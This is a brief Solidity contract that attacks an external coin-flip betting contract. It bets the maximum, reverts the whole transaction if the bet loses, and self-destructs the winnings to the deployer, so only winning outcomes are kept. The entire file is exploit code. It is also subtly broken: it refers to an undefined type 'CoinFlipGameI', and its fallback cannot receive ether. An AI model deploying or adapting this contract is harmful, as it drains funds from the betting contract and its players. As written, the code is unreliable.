pragma solidity ^0.5.0;
interface CoinFlipGame {
    function bet() external payable;
    function maxBet() external view returns(uint256);
}
contract CoinFlip {
    constructor(address contractAddress) public payable {
        uint256 balance = address(this).balance;
        CoinFlipGameI cfg = CoinFlipGame(contractAddress);
        cfg.bet.value(cfg.maxBet())();
        require(address(this).balance > balance, 'losttt!!!');   
        selfdestruct(msg.sender);
    }
    function() external {}
}
